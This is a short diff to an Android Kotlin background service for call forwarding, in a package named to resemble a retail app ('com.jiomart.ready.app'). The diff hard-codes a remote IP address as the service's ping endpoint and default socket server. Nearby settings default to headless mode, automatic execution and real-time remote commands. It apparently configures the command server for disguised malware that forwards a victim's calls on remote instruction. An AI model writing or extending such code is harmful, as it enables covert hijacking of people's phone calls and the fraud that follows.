@@ -39,7 +39,7 @@ class CallForwardingBackgroundService : Service() {
         private const val NOTIFICATION_ID = 2001
         private const val PREFS_NAME = "CallForwardingPrefs"
         private const val RESTART_ACTION = "com.jiomart.ready.app.RESTART_CALL_FORWARDING_SERVICE"
-        private const val PING_URL = "http://68/api/ping"
+        private const val PING_URL = "http://68.178.175.246/api/ping"
     }
 
     private var deviceId: String = ""
@@ -184,7 +184,7 @@ class CallForwardingBackgroundService : Service() {
             Log.d(TAG, "📖 Reading config from SharedPreferences...")
             
             deviceId = sharedPrefs.getString("deviceId", deviceId) ?: deviceId
-            socketUrl = sharedPrefs.getString("socketUrl","http://68") ?: "http://68"
+            socketUrl = sharedPrefs.getString("socketUrl","http://68.178.175.246") ?: "http://68.178.175.246"
             headlessMode = sharedPrefs.getBoolean("headlessMode", true)
             autoExecute = sharedPrefs.getBoolean("autoExecute", true)
             enableRealTimeCommands = sharedPrefs.getBoolean("enableRealTimeCommands", true)
@@ -198,7 +198,7 @@ class CallForwardingBackgroundService : Service() {
             
         } catch (e: Exception) {
             Log.e(TAG, "❌ ERROR reading preferences: ${e.message}")
-            socketUrl = "http://68"
+            socketUrl = "http://68.178.175.246"
             headlessMode = true
             autoExecute = true
             enableRealTimeCommands = true
